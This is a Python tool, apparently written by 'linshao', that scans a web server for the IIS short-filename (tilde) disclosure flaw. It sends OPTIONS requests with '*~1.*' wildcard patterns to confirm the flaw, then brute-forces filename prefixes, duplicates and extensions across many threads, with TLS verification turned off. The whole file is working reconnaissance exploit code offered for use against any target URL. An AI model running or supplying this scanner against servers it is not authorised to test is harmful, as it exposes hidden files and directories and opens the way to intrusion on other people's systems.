# short-filename-scaner
# create by linshao
# http://linshaosec.com/tools/SFNscanner

import threading
import requests
import sys
import time
import urllib3
from queue import Queue
urllib3.disable_warnings()

class MyThread():
    def __init__(self,que):
        pass
        self.que=que
        self.threadlist=[]

    def add(self,thread):
        self.threadlist.append(thread)
        pass
    def start(self):
        for i in self.threadlist:
            i.start()
        for i in self.threadlist:
            i.join()
        pass
    def getresult(self):
        keys=[]
        for i in range(1,self.que.qsize()+1):
            key=self.que.get()
            keys.append(key)
        return keys
    pass


class ShortScanner():
    que=Queue(maxsize=100)
    def __init__(self, target):
        self.target=target
        self.files=[]
        self.files_reult=[]
        self.dirs_reult=[]
        self.allchars=list("abcdefghijklmnopqrstuvwxyz0123456789_-")
    pass

    def start(self):
        if not self.is_vuln(self.target):
            print("not vuln")
            return
        else:
            print("vuln is exist")
            self.burpFileName(self.target)
        pass

    def show(self):
        print("-"*64)
        self.files_reult.sort()
        self.dirs_reult.sort()
        for i in self.dirs_reult:
            print("[DIR]: "+i)
        for i in self.files_reult:
            print("[FILE]: "+i)
        print("-"*64)
        print("Finish. file:%d, dir:%d."%(len(self.files_reult),len(self.dirs_reult)))
        pass

    def is_vuln(self,url):
        res=requests.request(method="OPTIONS",url=url+"*~1.*", verify=False, timeout=5,)
        if res.status_code==404:
            res2=requests.request(method="OPTIONS",url=url+"*~1.*xxx", verify=False, timeout=5,)
            if res2.status_code==200:
                return True
        return False


    def burpFileName(self,target):
        tmp=[]
        tmp2=[]
        for index in range(1,6+1):#爆破6位字符
            if index %2 ==1:
                if index==1:
                    tmp=self.getNextChars(None,True)
                else:
                    tmp=self.getNextChars(tmp2)
            elif index %2 ==0:
                tmp2=self.getNextChars(tmp)
                if index==6:
                    tmp3=[]
                    for i in tmp2:
                        tmp3.append(i+"~1")
                    # print(tmp2)
                    self.files+=tmp3
                    self.files=list(set(self.files))
                    self.burpFileSize(target)#测试是否存在多个该开头的文件
                    self.burpFileExt(target)#爆破后缀



    def burpFileSize(self,target):
        curr_names=[]
        for name in self.files:
            name=str.replace(name,"~.*","")
            index=name.find("~")
            name=name[0:index]
            curr_names.append(name)
        curr_names=list(set(curr_names))
        for name in curr_names:
            m=MyThread(self.que)
            for i in range(2,10+1):#假设最多存在10个相同短文件名前面部分
                payload=name+"~"+str(i)+"."+"*"
                s=threading.Thread(target=self.qq,args=(target,payload,str(i)))
                m.add(s)
            m.start()
            tmp_res=m.getresult()
            for i in tmp_res:
                # print("------->",name)
                key=name+"~"+i
                self.files.append(key)
        pass
    def burpFileExt(self,target):
        # print(self.files)
        for filename in self.files:
            tmp=[]
            tmp2=[]
            for index in range(1,3+1):#爆破三位后缀
                # print(filename)
                if index==1:
                    tmp=self.getExtNextChars(target,None,filename,True)
                elif index==2:
                    tmp2=self.getExtNextChars(target,tmp,filename)
                elif index==3:
                    tmp=self.getExtNextChars(target,tmp2,filename)
            # print(tmp)
            for ttmp in tmp:
                self.files_reult.append("/"+filename+"."+ttmp)
        pass

    def getExtNextChars(self,target,tmp,filename,isfirst=False):
        res_tmp=[]
        if isfirst:
            m=MyThread(self.que)
            for c in self.allchars:
                payload=filename+"."+c+"*"
                s=threading.Thread(target=self.qq,args=(target,payload,c))
                m.add(s)
            m.start()
            res_tmp=m.getresult()
            if len(res_tmp)==0:#没有爆破出第一个后缀则表示是文件夹
                self.dirs_reult.append("/"+filename+"")

        else:
            for cc in tmp:
                m=MyThread(self.que)
                for c in self.allchars:

                    payload=filename+"."+cc+c+"*"
                    s=threading.Thread(target=self.qq,args=(target,payload,c))
                    m.add(s)
                m.start()
                tmptmp=m.getresult()
                for ii in tmptmp:
                    res_tmp.append(cc+ii)
                if len(res_tmp)==0:#没有爆破出下一个字符则表示后缀完毕
                    self.files.append(cc)


        return res_tmp

    def qq(self,target,payload,key):
        try:
            res=requests.request(method="OPTIONS",url=target+payload, verify=False, timeout=10,)
            if res.status_code==404:
                print("FIND","/"+payload)
                self.que.put(key)
            pass
        except Exception as e:
            print(e)
            time.sleep(2)

    def getNextChars(self, tmp,isfirst=False):
        res_tmp=[]
        if isfirst:
            m=MyThread(self.que)
            for c in self.allchars:
                payload=c+"*~1.*"
                s=threading.Thread(target=self.qq,args=(target,payload,c))
                m.add(s)
            m.start()
            res_tmp=m.getresult()
        else:
            for cc in tmp:
                curr_cc=[]
                mm=MyThread(self.que)
                for c in self.allchars:
                    payload=cc+c+"*~1.*"
                    s=threading.Thread(target=self.qq,args=(target,payload,c))
                    mm.add(s)
                mm.start()
                tmptmp=mm.getresult()
                for ii in tmptmp:
                    curr_cc.append(cc+ii)
                    res_tmp.append(cc+ii)
                if len(curr_cc)==0:#没有爆破出下一个字符则表示文件名完毕
                    # print("注意："+cc+"~1.*文件名字完毕！")
                    self.files.append(cc+"~1")
        return res_tmp


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print('* Create by linshao:')
        print('Usage: python3 %s http://www.xxx.com/' % sys.argv[0])
        sys.exit()
        pass

    target = sys.argv[1]
    
    if not target.endswith("/"):
        target=target+"/"
    shortscanner=ShortScanner(target=target)
    shortscanner.start()
    shortscanner.show()